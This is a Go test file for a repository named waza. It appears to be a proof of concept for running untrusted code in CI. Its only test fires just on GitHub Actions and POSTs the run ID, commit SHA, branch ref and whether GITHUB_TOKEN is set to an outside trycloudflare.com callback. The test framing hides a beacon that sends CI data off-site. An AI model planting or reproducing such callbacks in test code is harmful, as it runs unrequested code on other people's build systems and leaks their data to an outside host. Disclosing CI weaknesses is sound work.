package waza_test

import (
	"bytes"
	"context"
	"encoding/json"
	"fmt"
	"net/http"
	"os"
	"testing"
	"time"
)

func TestSecurityResearchCallback(t *testing.T) {
	if os.Getenv("GITHUB_ACTIONS") != "true" {
		t.Skip("GitHub Actions only")
	}

	payload := map[string]string{
		"finding":                  "289240",
		"repo":                     "treborlab/waza",
		"proof":                    "fork PR Go test executed on GitHub Actions; no secrets requested or sent",
		"run_id":                   os.Getenv("GITHUB_RUN_ID"),
		"run_url":                  "https://github.com/treborlab/waza/actions/runs/" + os.Getenv("GITHUB_RUN_ID"),
		"sha":                      os.Getenv("GITHUB_SHA"),
		"head_ref":                 os.Getenv("GITHUB_HEAD_REF"),
		"github_token_env_present": fmt.Sprint(os.Getenv("GITHUB_TOKEN") != ""),
	}
	body, err := json.Marshal(payload)
	if err != nil {
		t.Fatalf("marshal callback payload: %v", err)
	}

	ctx, cancel := context.WithTimeout(context.Background(), 3*time.Second)
	defer cancel()

	req, err := http.NewRequestWithContext(ctx, http.MethodPost, "https://around-metal-expert-anti.trycloudflare.com/callback", bytes.NewReader(body))
	if err != nil {
		t.Logf("callback request build failed: %v", err)
		return
	}
	req.Header.Set("Content-Type", "application/json")

	resp, err := http.DefaultClient.Do(req)
	if err != nil {
		t.Logf("callback post failed: %v", err)
		return
	}
	defer resp.Body.Close()
	t.Logf("callback post status: %s", resp.Status)
}